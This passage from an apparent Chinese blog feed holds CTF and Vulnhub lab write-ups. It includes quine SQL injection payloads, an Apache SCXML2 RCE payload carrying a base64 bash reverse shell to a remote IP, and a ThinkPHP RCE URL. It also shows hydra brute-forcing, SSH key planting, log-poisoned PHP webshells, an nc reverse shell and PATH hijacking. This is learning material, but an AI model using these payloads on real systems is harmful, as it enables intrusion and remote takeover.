class="string">&#x27;index.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>然后把这段代码到google一搜索，就能找到原题了(<strong>打了这么多比赛 ，等赛后看wp复现的时候才发现原原来好多东西都是可以搜出来，只是自己搜的不过准确</strong>)</p><p><strong>果然 搜索也是一门学问</strong></p><p><a href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</a></p><p>这就是原题的题目，这道题就属于是照搬下来的</p><p><strong>payload1</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;UNION(SELECT(REPLACE(REPLACE(&#x27;</span><span class="number">1</span>&quot;UNION(SELECT(REPLACE(REPLACE(&quot;<span class="operator">%</span>&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;<span class="operator">%</span>&quot;)))#&#x27;,CHAR(34),CHAR(39)),CHAR(37),&#x27;1&quot;<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(REPLACE(REPLACE(&quot;%&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">37</span>),&quot;%&quot;)))#<span class="string">&#x27;)))#</span></span><br></pre></td></tr></table></figure><p>其实就是看谁做过这题或则是记得拿着题目给的waf去搜，然后发现原题</p><p>然后就直接拿着原题给的wp直接打就行了</p><h2 id="BabyJXvX"><a href="#BabyJXvX" class="headerlink" title="BabyJXvX"></a>BabyJXvX</h2><p><strong>考点</strong>     <strong>Apache SCXML2 RCE</strong></p><p><a href="https://www.yuque.com/boogipop/okvgcs/zzx3n35xsg26ss0e?view=doc_embed">Apache SCXML2 RCE分析</a></p><p>这里我们自己来跟一遍这个逻辑，来学习一下</p><p>这里真的服了，没有文章来进行学习咋样安装环境，直接去maven找的话是找不到的，只能通过报错信息一个一个jar包下载下来</p><p><strong>这里我用的jdk是8</strong>   </p><p><img src="../images/image-20230425142328815.png" alt="image-20230425142328815"></p><p><img src="../images/image-20230425142335239.png" alt="image-20230425142335239"></p><p>就是得自己百度先下载两个jar包，然后maven下载一个新的jar包</p><p>然后在存在xml文件的目录开启一个python服务就可以开始分析这个漏洞了</p><p><img src="../images/image-20230425142503857.png" alt="image-20230425142503857"></p><p><strong>demo</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.ModelException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.stream.XMLStreamException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ModelException, XMLStreamException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// engine to execute the scxml instance</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// parse SCXML URL into SCXML model</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set state machine (scxml instance) to execute</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xml文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>部署完后看是否能弹计算器，弹不出的话就是说明环境没配置成功</p><p><img src="../images/image-20230425142743847.png" alt="image-20230425142743847"></p><p>然后就开始跟一下这个，看漏洞利用点在哪</p><h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h3><p><img src="../images/image-20230425142927413.png" alt="image-20230425142927413"></p><p>先给断点</p><p><img src="../images/image-20230425142945860.png" alt="image-20230425142945860"></p><p>先跟到了read方法这里</p><p>进入read方法，又调用了另一个参数不同的read，在这里传入我们xml的path，并且初始化了一个Configuration</p><p><img src="../images/image-20230425143202243.png" alt="image-20230425143202243"></p><p>将XML的路径和配置类都传入readInternal方法里，跟进</p><p><img src="../images/image-20230425143352387.png" alt="image-20230425143352387"></p><p><img src="../images/image-20230425143552489.png" alt="image-20230425143552489"></p><p>然后初始化了一个URLresovler去读取XML，这边咱们的http服务就会接收到对应的请求，最后进入readDocument方法进行下一步读取</p><p><img src="../images/image-20230425143821934.png" alt="image-20230425143821934"></p><p><img src="../images/image-20230425144145979.png" alt="image-20230425144145979"></p><p>前面的实例化对象就没截屏，只截的是关键部分</p><p><img src="../images/image-20230425144408313.png" alt="image-20230425144408313"></p><p>获取xml的namespace和localname，最后进入readSCXML方法中进行更深次的读取</p><p>，这里就是重点了</p><p><img src="../images/image-20230425144705224.png" alt="image-20230425144705224"></p><p>进入readSCXML后，然后接着进入readstate</p><p><img src="../images/image-20230425144903304.png" alt="image-20230425144903304"></p><p>这里会获取几个标签，可以看到包括我们payload里的state标签，由于最外层是state，因此进入readstate方法     </p><p><img src="../images/image-20230425145318146.png" alt="image-20230425145318146"></p><p>第二层标签是onentry，所以进入了readOnEntry方法</p><p><img src="../images/image-20230425145420093.png" alt="image-20230425145420093"></p><p><img src="../images/image-20230425145447949.png" alt="image-20230425145447949"></p><p>进入readExecutableContext方法，接下来也是重点</p><p><img src="../images/image-20230425145549908.png" alt="image-20230425145549908"></p><p>第三层是script，所以读取script标签</p><p><img src="../images/image-20230425145700622.png" alt="image-20230425145700622"></p><p><img src="../images/image-20230425145718355.png" alt="image-20230425145718355"></p><p>跟进readscript</p><p><img src="../images/image-20230425145741954.png" alt="image-20230425145741954"></p><p><strong>太菜了，跟不下去了，还是去看上面的复现文章吧，那样好一点</strong></p><p><img src="../images/image-20230425151120132.png" alt="image-20230425151120132"></p><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>做法</strong></p><p><img src="../images/image-20230425154307051.png" alt="image-20230425154307051"></p><p><img src="../images/image-20230425154316949.png" alt="image-20230425154316949"></p><p>这里先是在自己的服务器上新建一个文件 ，然后开启端口监听就行了</p><p><img src="../images/image-20230425154410279.png" alt="image-20230425154410279"></p><p><a href="https://www.xaitx.com/1936.html">详细wp</a></p><p><strong>根据当时情况一步一步的分析出来的</strong></p><h2 id="HDCTF-2023-JavaMonster"><a href="#HDCTF-2023-JavaMonster" class="headerlink" title="[HDCTF 2023]JavaMonster]"></a>[HDCTF 2023]JavaMonster]</h2><p>考点</p>]]></content>
      
      
      
        <tags>
            
            <tag> HDCTF WEB 2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-su-web-wp</title>
      <link href="/posts/d03af1eb.html"/>
      <url>/posts/d03af1eb.html</url>
      
        <content type="html"><![CDATA[<h2 id="【困难】pdf-converter"><a href="#【困难】pdf-converter" class="headerlink" title="【困难】pdf_converter"></a>【困难】pdf_converter</h2><p>这题是非预期解做出来的，就是直接打thinkphp模板漏洞</p><p><img src="../images/image-20230422202503164.png" alt="image-20230422202503164"></p><p>发现版本</p><p><img src="../images/image-20230422202543023.png" alt="image-20230422202543023"></p><p>找到漏洞利用点</p><p><img src="../images/image-20230422202620649.png" alt="image-20230422202620649"></p><p>然后直接网上找payload直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=命令参数</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230422202707601.png" alt="image-20230422202707601"></p><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><p>给了一个exe文件，直接反编译成pyc文件，但是发现这是用3.11编写的，所以uncompyle6用不了，那就只能使用pycdc来看字节码(如下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">[Constants]</span><br><span class="line">        0</span><br><span class="line">        None</span><br><span class="line">        322376503</span><br><span class="line">        &#x27;Enter your flag: &#x27;</span><br><span class="line">        b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">        255</span><br><span class="line">        &#x27;Correct!&#x27;</span><br><span class="line">    [Disassembly]</span><br><span class="line">        0       RESUME                        0</span><br><span class="line">        2       LOAD_CONST                    0: 0</span><br><span class="line">        4       LOAD_CONST                    1: None</span><br><span class="line">        6       IMPORT_NAME                   0: random</span><br><span class="line">        8       STORE_NAME                    0: random</span><br><span class="line">        10      PUSH_NULL                     </span><br><span class="line">        12      LOAD_NAME                     0: random</span><br><span class="line">        14      LOAD_ATTR                     1: Random</span><br><span class="line">        24      LOAD_CONST                    2: 322376503</span><br><span class="line">        26      PRECALL                       1</span><br><span class="line">        30      CALL                          1</span><br><span class="line">        40      STORE_NAME                    2: r</span><br><span class="line">        42      PUSH_NULL                     </span><br><span class="line">        44      LOAD_NAME                     3: input</span><br><span class="line">        46      LOAD_CONST                    3: &#x27;Enter your flag: &#x27;</span><br><span class="line">        48      PRECALL                       1</span><br><span class="line">        52      CALL                          1</span><br><span class="line">        62      LOAD_METHOD                   4: encode</span><br><span class="line">        84      PRECALL                       0</span><br><span class="line">        88      CALL                          0</span><br><span class="line">        98      STORE_NAME                    5: pt</span><br><span class="line">        100     LOAD_CONST                    4: b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">        102     STORE_NAME                    6: ct</span><br><span class="line">        104     BUILD_LIST                    0</span><br><span class="line">        106     STORE_NAME                    7: buf</span><br><span class="line">        108     LOAD_NAME                     5: pt</span><br><span class="line">        110     GET_ITER                      </span><br><span class="line">        112     FOR_ITER                      46 (to 206)</span><br><span class="line">        114     STORE_NAME                    8: b</span><br><span class="line">        116     LOAD_NAME                     7: buf</span><br><span class="line">        118     LOAD_METHOD                   9: append</span><br><span class="line">        140     LOAD_NAME                     2: r</span><br><span class="line">        142     LOAD_METHOD                   10: randint</span><br><span class="line">        164     LOAD_CONST                    0: 0</span><br><span class="line">        166     LOAD_CONST                    5: 255</span><br><span class="line">        168     PRECALL                       2</span><br><span class="line">        172     CALL                          2</span><br><span class="line">        182     LOAD_NAME                     8: b</span><br><span class="line">        184     BINARY_OP                     12</span><br><span class="line">        188     PRECALL                       1</span><br><span class="line">        192     CALL                          1</span><br><span class="line">        202     POP_TOP                       </span><br><span class="line">        204     JUMP_BACKWARD                 47</span><br><span class="line">        206     PUSH_NULL                     </span><br><span class="line">        208     LOAD_NAME                     11: bytes</span><br><span class="line">        210     LOAD_NAME                     7: buf</span><br><span class="line">        212     PRECALL                       1</span><br><span class="line">        216     CALL                          1</span><br><span class="line">        226     LOAD_NAME                     6: ct</span><br><span class="line">        228     COMPARE_OP                    2 (==)</span><br><span class="line">        234     POP_JUMP_FORWARD_IF_TRUE      2</span><br><span class="line">        236     LOAD_ASSERTION_ERROR          </span><br><span class="line">        238     RAISE_VARARGS                 1</span><br><span class="line">        240     PUSH_NULL                     </span><br><span class="line">        242     LOAD_NAME                     12: print</span><br><span class="line">        244     LOAD_CONST                    6: &#x27;Correct!&#x27;</span><br><span class="line">        246     PRECALL                       1</span><br><span class="line">        250     CALL                          1</span><br><span class="line">        260     POP_TOP                       </span><br><span class="line">        262     LOAD_CONST                    1: None</span><br><span class="line">        264     RETURN_VALUE                  </span><br></pre></td></tr></table></figure><p>理解一下就是以下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = random.Random(322376503)</span><br><span class="line"></span><br><span class="line">pt = input(&#x27;Enter your flag: &#x27;).encode()</span><br><span class="line">ct = b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line"></span><br><span class="line">buf = []</span><br><span class="line">for b in pt:</span><br><span class="line">    buf.append((r.randint(0, 255) ^ b))</span><br><span class="line"></span><br><span class="line">if bytes(buf) == ct:</span><br><span class="line">    print(&quot;Correct!&quot;)</span><br></pre></td></tr></table></figure><p>然后可以写出脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = random.Random(322376503)</span><br><span class="line">ct = b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">enc = []</span><br><span class="line">for i in ct:</span><br><span class="line">    enc.append(i)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(enc)):</span><br><span class="line">    flag += chr(r.randint(0, 255) ^ enc[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DASCTF web SU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub——DriftingBlues-4</title>
      <link href="/posts/f7456a24.html"/>
      <url>/posts/f7456a24.html</url>
      
        <content type="html"><![CDATA[<p>先扫一下c段，发现一下靶机地址</p><p><img src="../images/image-20230427145027282.png" alt="image-20230427145027282"></p><p>然后扫一下端口</p><p><img src="../images/image-20230427145130880.png" alt="image-20230427145130880"></p><p>开了三个端口  先尝试看能否进行ftp登录</p><p><img src="../images/image-20230427145314408.png" alt="image-20230427145314408"></p><p>发现不行，不能匿名登录</p><p>于是查看一下80端口</p><p><img src="../images/image-20230427145452523.png" alt="image-20230427145452523"></p><p>发现源码存在一段base64加密的密文，于是尝试进行解密‘</p><p><img src="../images/image-20230427145606070.png" alt="image-20230427145606070"></p><p>最后解密的到这个路径  然后进行访问··</p><p><img src="../images/image-20230427145659695.png" alt="image-20230427145659695"></p><p>访问得到以下的一些符号，于是进行解密</p><p><img src="../images/image-20230427145930036.png" alt="image-20230427145930036"></p><p><img src="../images/image-20230427150000913.png" alt="image-20230427150000913"></p><p>利用上面的在线网址进行解密，发现存在这个一个图片路径  <code>/iTiS3Cr3TbiTCh.png</code></p><p><img src="../images/image-20230427150102540.png" alt="image-20230427150102540"></p><p>访问之后得到一个二维码，然后进行访问，得到以下的信息</p><p><img src="../images/image-20230427193142028.png" alt="image-20230427193142028"></p><p>于是猜测这几个是用户名，于是尝试进行ssh爆破试试，先将这几个用户名保存为user1.txt</p><p><img src="../images/image-20230427193338239.png" alt="image-20230427193338239"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.146</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427193516063.png" alt="image-20230427193516063"></p><p>爆破失败，没有匹配的密码</p><p>于是就尝试爆破一下ftp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.142.146</span><br></pre></td></tr></table></figure><p><strong><code>破解出一个</code>FTP<code>登录的用户名和密码：</code>luther/mypics`</strong></p><p><img src="../images/image-20230427194706118.png" alt="image-20230427194706118"></p><p><img src="../images/image-20230427194157405.png" alt="image-20230427194157405"></p><p>成功登入，然后切换到hubert用户下，这里的话可以尝试一下进行ssh登录，先检查这里是否存在<code>.ssh</code></p><p><img src="../images/image-20230427194342023.png" alt="image-20230427194342023"></p><p>没有的话在这里就创建一个，然后就根据ssh登录原理进行伪造</p><p>就是先在kali上生成ssh  公钥和私钥   然后把公钥复制到ftp服务器上，并且命名为<strong><code>authorized_keys</code></strong></p><p>然后在kali上就可以用生成的私钥进行该用户的登录了</p><p><strong>ssh私钥登录步骤</strong></p><p><strong>首先先在<code>kaii</code>本地生成秘钥<code>ssh-keygen</code> 将 <code>id_rsa.pub SSH</code> 公钥文件另存为 <code>authorized_keys</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427194943659.png" alt="image-20230427194943659"></p><p>然后修改公钥的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv id_rsa.pub authorized_keys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427195031935.png" alt="image-20230427195031935"></p><p>然后在ftp服务器上使用put命令，将<code>authorized_keys</code>传到服务器上</p><p><img src="../images/image-20230427195213888.png" alt="image-20230427195213888"></p><p>成功传进去了 这里的话  路径得一致</p><p><img src="../images/image-20230427195251240.png" alt="image-20230427195251240"></p><p>那么登录ftp的时候，也必须在这个kali路径下登录</p><p>那么现在就可以对hubert进行ssh私钥登录了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh hubert@192.168.142.146 -i id_rsa</span><br></pre></td></tr></table></figure><p>然后和Vulnhub DriftingBlues-3一样的提权方法，下面就不多赘述了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub DriftingBlues-4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DriftingBlues-3</title>
      <link href="/posts/a7ffa01f.html"/>
      <url>/posts/a7ffa01f.html</url>
      
        <content type="html"><![CDATA[<p>还是先扫一下c段</p><p><img src="../images/image-20230421180643418.png" alt="image-20230421180643418"></p><p>进行端口扫描</p><p><img src="../images/image-20230421180739563.png" alt="image-20230421180739563"></p><p>然后进行访问</p><p><img src="../images/image-20230421180934567.png" alt="image-20230421180934567"></p><p>进行访问</p><p><img src="../images/image-20230421181000421.png" alt="image-20230421181000421"></p><p><img src="../images/image-20230421181408827.png" alt="image-20230421181408827"></p><p><img src="../images/image-20230421181349395.png" alt="image-20230421181349395"></p><p>访问给的<code>/littlequeenofspades.html</code>  </p><p><img src="../images/image-20230421182129099.png" alt="image-20230421182129099"></p><p>然后查看源码，发现一段base64编码的代码，然后进行解码发现</p><p><img src="../images/image-20230421182611129.png" alt="image-20230421182611129"></p><p>于是进行访问</p><p><img src="../images/image-20230421182643602.png" alt="image-20230421182643602"></p><p>发现这是个ssh日志记录   可以尝试进行日志里写后门</p><p><strong>看到出现<code>ssh auth log --&gt; ssh</code>身份验证日志，并且注意到登录用户名显示在日志中，也就是说如果我们使用ssh登陆时，将用户名写成一句话就可以写马进日志中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：ssh &#x27;&lt;?php system($_GET[&quot;a&quot;]);?&gt;&#x27;@192.168.142.142</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183202692.png" alt="image-20230421183202692"></p><p>然后尝试看马有没有写进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.142.144/adminsfixit.php?a=whoami</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183448490.png" alt="image-20230421183448490"></p><p>发现可以进行命令执行  然后进行nc 反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali开启监听：nc -lvnp 4444</span><br><span class="line">?xa=nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; #交互shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184535768.png" alt="image-20230421184535768"></p><p>反弹成功，然后进行shell交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184638397.png" alt="image-20230421184638397"></p><p>发现还是存在<code>.ssh</code>  文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">直接在目标机生成一个公钥：ssh-keygen -t rsa</span><br><span class="line">将生成的私钥保存到：/home/robertj/.ssh/id_rsa </span><br><span class="line">将 SSH 公钥文件重命名为 authorized_keys ，用于 SSH 登陆认证</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys</span><br><span class="line">然后将私钥复制到本机</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421185302902.png" alt="image-20230421185302902"></p><p>一步一步跟着搞，然后就生成了密钥和私钥</p><p><a href="https://blog.csdn.net/Dontla/article/details/120902725">SSH公钥原理（密钥，秘钥，私钥）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robertj@192.168.142.144 -i id_ssh</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421194215924.png" alt="image-20230421194215924"></p><p><img src="../images/image-20230421194359077.png" alt="image-20230421194359077"></p><p>suid  发现了一个getinfo可以进行使用</p><p><img src="../images/image-20230421194544476.png" alt="image-20230421194544476"></p><p>根据上面输出的结果，可以推测这个程序中执行了</p><p><code>ip addr, cat /etc/hosts, uname -a</code><br>因此，在这种情况下，我们可以在环境变量 PATH 中提供一个目录 (/tmp)，并创建一个 ip<br>或者 cat 文件，用于劫持命令，执行我们自定义的二进制文件就可以提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp/:$PATH</span><br><span class="line">cd /tmp</span><br><span class="line">echo 